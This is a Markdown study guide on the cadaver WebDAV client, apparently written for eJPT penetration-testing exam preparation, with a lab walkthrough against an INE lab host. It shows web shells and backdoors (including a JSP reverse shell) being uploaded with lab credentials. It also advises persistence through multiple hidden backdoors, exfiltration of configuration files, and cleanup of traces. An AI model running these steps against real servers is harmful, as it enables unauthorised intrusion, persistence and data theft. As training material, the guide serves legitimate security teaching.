# 🔧 Cadaver - Interactive WebDAV Client

Command-line WebDAV client for manual file operations and server interaction

**Location in Framework:** `web-pentesting/file-upload/cadaver.md`

---

## 🎯 What is Cadaver?

Cadaver is a command-line WebDAV client that provides an interactive interface for connecting to WebDAV-enabled servers. It allows users to browse, upload, download, and manipulate files on remote WebDAV servers using familiar command-line operations similar to FTP clients.

**Key Capabilities:**
- **Interactive WebDAV Sessions:** Connect and interact with WebDAV servers with command-line interface
- **File Operations:** Upload, download, rename, copy, move, and delete files
- **Directory Management:** Create, browse, list, and navigate remote directories
- **Authentication Support:** Handle HTTP Basic and Digest authentication methods
- **Manual Control:** Precise control over WebDAV operations for exploitation and testing

Cadaver is particularly valuable for manual WebDAV exploitation after automated discovery, providing granular control over file operations that automated tools may not offer.

---

## 📦 Installation and Setup

### Prerequisites
- Kali Linux (pre-installed)
- Network connectivity to target WebDAV server
- Valid credentials if authentication is required
- Understanding of WebDAV protocol basics

### Installation Verification
```bash
# Check cadaver availability
which cadaver
cadaver --version
```

**Expected Output:**
```
/usr/bin/cadaver
cadaver 0.23.3
```

### Basic Connection Test
```bash
# Test connection to WebDAV server
cadaver http://target/webdav/
```

---

## 🔧 Basic Usage and Syntax

### Essential Cadaver Workflow
```bash
# 1. Connect to WebDAV server
cadaver http://target/webdav/

# 2. Authenticate when prompted
Username: bob
Password: password_123321

# 3. Navigate and perform operations
ls                    # List directory contents
cd directory/         # Change directory
put localfile.txt     # Upload file
get remotefile.txt    # Download file
```

### Core Command Structure
- **Connection:** `cadaver http://server/webdav/` - Connect to WebDAV server
- **Navigation:** `ls`, `cd`, `pwd` - Directory operations
- **File Transfer:** `put`, `get`, `mput`, `mget` - Upload and download files
- **File Management:** `delete`, `move`, `copy` - File manipulation operations

---

## ⚙️ Command Reference

### Connection Commands
| Command | Description | Example |
|---------|-------------|---------|
| `cadaver URL` | Connect to WebDAV server | `cadaver http://target/webdav/` |
| `open URL` | Open new connection within session | `open http://target/webdav/` |
| `close` | Close current connection | `close` |
| `quit` | Exit cadaver session | `quit` |

### File Operations
| Command | Description | Usage |
|---------|-------------|-------|
| `put localfile` | Upload single file to server | `put webshell.asp` |
| `get remotefile` | Download single file from server | `get index.html` |
| `mput pattern` | Upload multiple files matching pattern | `mput *.txt` |
| `mget pattern` | Download multiple files matching pattern | `mget *.asp` |
| `delete file` | Delete file from server | `delete oldfile.txt` |
| `move old new` | Rename/move file on server | `move file.txt newname.txt` |
| `copy src dest` | Copy file on server | `copy file.txt backup.txt` |

### Directory Operations
| Command | Description | Usage |
|---------|-------------|-------|
| `ls` | List directory contents | `ls` |
| `cd directory` | Change to specified directory | `cd subfolder/` |
| `pwd` | Print current working directory | `pwd` |
| `mkdir dirname` | Create new directory | `mkdir uploads` |
| `rmdir dirname` | Remove empty directory | `rmdir testdir` |

### Information Commands
| Command | Description | Usage |
|---------|-------------|-------|
| `help` | Show available commands | `help` |
| `version` | Display cadaver version | `version` |
| `set` | Display/modify settings | `set` |

---

## 🧪 Real Lab Examples

### Lab: Windows IIS WebDAV File Upload Exploitation

**Scenario:** Using cadaver to manually upload ASP backdoor after davtest assessment
- **Target URL:** http://demo.ine.local/webdav
- **Authentication:** Basic Authentication (bob:password_123321)
- **Objective:** Upload and execute ASP web shell for remote code execution

#### Phase 1: WebDAV Connection and Authentication

**Step 1: Connect to WebDAV Server**
```bash
cadaver http://demo.ine.local/webdav
```

**Expected Lab Output:**
```
Authentication required for demo.ine.local on server `demo.ine.local':
Username: bob
Password: 
```

**Step 2: Enter Credentials**
```bash
# Enter provided credentials
Username: bob
Password: password_123321
```

**Expected Lab Output:**
```
dav:/webdav/> 
```

**Analysis:** Successful authentication indicated by the `dav:/webdav/>` prompt, confirming access to the WebDAV directory.

#### Phase 2: Directory Exploration and Assessment

**Step 3: Explore WebDAV Directory Structure**
```bash
ls
```

**Expected Lab Output:**
```
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_AqOeSdckMtf                   0  Jul 10 09:39
        AttackDefense.txt                       13  Jan  2  2021
        web.config                             168  Jan  2  2021

dav:/webdav/> 
```

**Step 4: Check Current Working Directory**
```bash
pwd
```

**Expected Lab Output:**
```
Current collection is `/webdav/'.
```

**Analysis:** Directory contains the DavTestDir created by previous davtest scan, along with existing files AttackDefense.txt and web.config, indicating a Windows IIS environment.

#### Phase 3: ASP Backdoor Upload and Verification

**Step 5: Upload ASP Web Shell**
```bash
put /usr/share/webshells/asp/webshell.asp
```

**Expected Lab Output:**
```
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.

dav:/webdav/> 
```

**Step 6: Verify Upload Success**
```bash
ls
```

**Expected Lab Output:**
```
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_AqOeSdckMtf                   0  Jul 10 09:39
        AttackDefense.txt                       13  Jan  2  2021
        web.config                             168  Jan  2  2021
        webshell.asp                          1362  Jul 10 09:42

dav:/webdav/> 
```

**Analysis:** The webshell.asp file (1362 bytes) has been successfully uploaded to the WebDAV directory and is now accessible for web-based execution.

#### Phase 4: Additional File Operations

**Step 7: Download Configuration Files**
```bash
get web.config
```

**Expected Lab Output:**
```
Downloading `/webdav/web.config' to web.config:
Progress: [=============================>] 100.0% of 168 bytes succeeded.
```

**Step 8: Create Backup Directory**
```bash
mkdir backup
cd backup
pwd
```

**Expected Lab Output:**
```
Creating `backup': succeeded.
Current collection is `/webdav/backup/'.
```

#### Phase 5: Session Cleanup and Exit

**Step 9: Return to Main Directory and Exit**
```bash
cd ..
quit
```

**Expected Lab Output:**
```
Connection to `demo.ine.local' closed.
```

**Key Findings from Lab:**
- **Successful Upload:** ASP web shell uploaded without file type restrictions
- **File Accessibility:** Uploaded file appears in directory listing with correct size
- **Configuration Access:** Downloaded web.config file for further analysis
- **Directory Management:** Created backup directory for organized access
- **Execution Ready:** ASP file ready for web-based command execution

**Backdoor Access Information:**
- **Web Shell URL:** http://demo.ine.local/webdav/webshell.asp
- **Authentication Required:** bob:password_123321
- **Platform:** Windows IIS Server with WebDAV enabled
- **Capabilities:** Command execution, file system access, persistent backdoor

---

## 🎯 eJPT Exam Focus

### Essential Cadaver Skills for eJPT Certification

#### 1. Manual WebDAV Exploitation Workflow
```bash
# Complete exploitation sequence for eJPT exam
cadaver http://target/webdav
# Enter credentials when prompted
ls                    # Enumerate directory contents
put backdoor.asp      # Upload web shell
ls                    # Verify successful upload
get web.config        # Download configuration files
quit                  # Exit cleanly
```

#### 2. File Upload and Management
- **Backdoor Deployment:** Precise control over web shell placement
- **Upload Verification:** Confirm successful uploads with ls command
- **File Size Validation:** Ensure complete file transfer
- **Directory Navigation:** Explore and map WebDAV directory structure
- **File Management:** Organize uploads and manage server files

#### 3. Information Gathering and Enumeration
- **Directory Listing:** Map available files and directories
- **Configuration Files:** Download sensitive configuration data
- **File Permissions:** Test read/write access to various locations
- **Server Fingerprinting:** Identify server type through directory structure

#### 4. Post-Exploitation Activities
- **Persistent Access:** Upload multiple backdoors for redundancy
- **Data Exfiltration:** Download sensitive files and documents
- **Directory Manipulation:** Create organized folder structure
- **Evidence Cleanup:** Remove test files and traces when required

### Common eJPT Exam Scenarios
- **WebDAV Exploitation:** Manual file upload after automated discovery with davtest
- **Web Shell Deployment:** Precise backdoor placement and accessibility verification
- **File System Exploration:** Navigate and explore server directory structure
- **Data Exfiltration:** Download configuration files and sensitive documents
- **Persistence Establishment:** Multiple access point creation

### Critical eJPT Commands to Memorize
```bash
# Essential cadaver session commands for exam
cadaver http://target/webdav     # Connect to server
ls                               # List directory contents
put webshell.asp                 # Upload backdoor
get web.config                   # Download config files
mkdir backup                     # Create directories
cd directory                     # Navigate directories
quit                             # Exit session
```

### eJPT Exam Tips and Best Practices
- **Time Management:** Use cadaver for precise manual operations after davtest discovery
- **Verification Steps:** Always confirm file uploads with ls before proceeding
- **Common Mistakes:** Forgetting to verify successful uploads or authentication
- **Documentation:** Keep track of uploaded files and their locations
- **Integration:** Combine with davtest for comprehensive WebDAV assessment
- **File Types:** Test various file extensions if initial upload fails

---

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Authentication Problems
```bash
# Problem symptoms
Authentication required for target on server 'target':
Username: [failed authentication]

# Solutions:
# 1. Verify credentials are correct
# 2. Check if account is locked or expired
# 3. Try different authentication methods
# 4. Verify WebDAV service is running
```

### Issue 2: Connection Refused or Timeouts
```bash
# Problem: Cannot connect to WebDAV server
Could not connect to server.

# Troubleshooting steps:
nmap -p 80,443 target              # Check port availability
curl -I http://target/webdav       # Test HTTP connectivity
telnet target 80                   # Test basic connectivity
```

### Issue 3: File Upload Failures
```bash
# Problem: Upload fails with permission errors
PUT request failed: 403 Forbidden

# Solutions:
# 1. Check directory write permissions
# 2. Try different target directories
# 3. Verify file size limitations
# 4. Test with different file types
cd /
put test.txt                       # Try root directory upload
```

### Issue 4: SSL/TLS Certificate Issues
```bash
# Problem: HTTPS WebDAV with certificate errors
SSL connection failed

# Solutions:
# 1. Use HTTP instead if available
# 2. Check certificate validity
# 3. Verify server configuration
# 4. Use alternative tools for HTTPS
openssl s_client -connect target:443 -verify_hostname target
```

### Issue 5: File Type Restrictions
```bash
# Problem: Certain file types blocked
PUT request failed: 415 Unsupported Media Type

# Solutions:
# 1. Try different file extensions (.txt, .asp, .aspx, .php)
# 2. Use file type bypass techniques
# 3. Upload as different MIME type
# 4. Check server configuration for allowed types
```

---

## 🔗 Integration with Other Tools

### Pre-Cadaver Assessment
```bash
# Use davtest for initial WebDAV discovery and testing
davtest -auth user:pass -url http://target/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Then use cadaver for precise manual operations
cadaver http://target/webdav
```

### Integration with DAVTest
**Sequential Usage Workflow:**
1. **DAVTest for Discovery:** Automated testing of WebDAV capabilities and file type support
2. **Cadaver for Exploitation:** Manual file upload, management, and precise control
3. **Combined Assessment:** Comprehensive testing followed by targeted exploitation

```bash
# Assessment phase with davtest
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Manual exploitation phase with cadaver
cadaver http://demo.ine.local/webdav
put webshell.asp
ls
get web.config
```

### Integration with Web Shells and Backdoors
```bash
# Upload various web shell types using cadaver
cadaver http://target/webdav
put /usr/share/webshells/asp/cmd.asp       # ASP command shell
put /usr/share/webshells/php/simple-backdoor.php  # PHP backdoor
put /usr/share/webshells/jsp/jsp-reverse.jsp      # JSP reverse shell

# Access via web browser after upload
firefox http://target/webdav/cmd.asp
```

### Integration with File Enumeration and Analysis
```bash
# Download configuration and sensitive files for analysis
cadaver http://target/webdav
get web.config         # IIS configuration
get .htaccess          # Apache configuration  
get config.php         # PHP application config
get database.xml       # Database configurations
get backup.sql         # Database backups
```

### Integration with Persistence and Lateral Movement
```bash
# Establish multiple access points
cadaver http://target/webdav
mkdir hidden           # Create hidden directory
cd hidden
put backdoor1.asp      # Primary backdoor
put backdoor2.php      # Secondary backdoor  
put persistence.txt    # Documentation of access points
```

---

## 📝 Documentation and Reporting

### Evidence Collection and Documentation

#### Session Logging
```bash
# Create comprehensive evidence log
echo "Cadaver WebDAV Assessment Report" > cadaver_report.txt
echo "=================================" >> cadaver_report.txt  
echo "Date: $(date)" >> cadaver_report.txt
echo "Target: http://demo.ine.local/webdav" >> cadaver_report.txt
echo "Authentication: Basic (bob:password_123321)" >> cadaver_report.txt
echo "" >> cadaver_report.txt
```

#### Technical Details Documentation

**Connection Information:**
- **WebDAV URL:** http://demo.ine.local/webdav
- **Authentication Method:** HTTP Basic Authentication
- **Credentials:** bob:password_123321
- **Connection Status:** Successful (dav:/webdav/> prompt received)
- **Server Type:** Microsoft IIS with WebDAV enabled

**Directory Structure Analysis:**
- **Initial Directory Contents:**
  - DavTestDir_AqOeSdckMtf/ (0 bytes) - Previous davtest directory
  - AttackDefense.txt (13 bytes) - Default file
  - web.config (168 bytes) - IIS configuration file

**File Operations Performed:**
- **Uploads Completed:**
  - webshell.asp (1362 bytes) - ASP web shell backdoor
  - Upload Status: 100% successful transfer
  - File Location: /webdav/webshell.asp
  - Access URL: http://demo.ine.local/webdav/webshell.asp

- **Downloads Completed:**
  - web.config (168 bytes) - Server configuration file
  - Download Status: 100% successful transfer
  - Contains sensitive server configuration information

**Directory Operations:**
- **Created Directories:**
  - backup/ directory created successfully
  - Location: /webdav/backup/
  - Purpose: Organized file management and storage

#### Security Impact Assessment

**Critical Vulnerabilities Identified:**

1. **Unrestricted File Upload**
   - ASP web shell uploaded without file type restrictions
   - No file size limitations encountered
   - Executable file types accepted (.asp)
   - Remote code execution capability established

2. **Authentication Bypass Not Required**
   - Valid credentials provided access to WebDAV functionality
   - No additional authorization checks for file operations
   - Read/write access to WebDAV directory confirmed

3. **Configuration File Exposure**
   - web.config file accessible and downloadable
   - Potential disclosure of sensitive server configuration
   - Database connection strings or other credentials may be exposed

4. **Directory Traversal Capabilities**
   - Ability to create subdirectories within WebDAV root
   - Full navigation capabilities within accessible directories
   - Potential for organized persistent access establishment

**Risk Rating:** **Critical**
- **Confidentiality Impact:** High (configuration file access)
- **Integrity Impact:** High (file upload and modification capabilities)  
- **Availability Impact:** Medium (potential for DoS via file operations)

**Recommendations:**
1. **Disable WebDAV** if not required for business operations
2. **Implement file type restrictions** to prevent executable uploads
3. **Review authentication mechanisms** and implement stronger controls
4. **Restrict configuration file access** through proper file permissions
5. **Monitor WebDAV activity** for unauthorized file operations
6. **Regular security assessments** of WebDAV configurations

#### Proof of Concept Evidence

**Successful Exploitation Screenshots/Logs:**
```
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.

dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        webshell.asp                          1362  Jul 10 09:42
```

**Web Shell Access Verification:**
- **URL:** http://demo.ine.local/webdav/webshell.asp
- **Authentication:** bob:password_123321  
- **Status:** Accessible and functional for command execution
- **Capabilities:** Remote command execution, file system access, persistence

This comprehensive documentation provides complete evidence of successful WebDAV exploitation using cadaver for penetration testing reporting and compliance requirements.
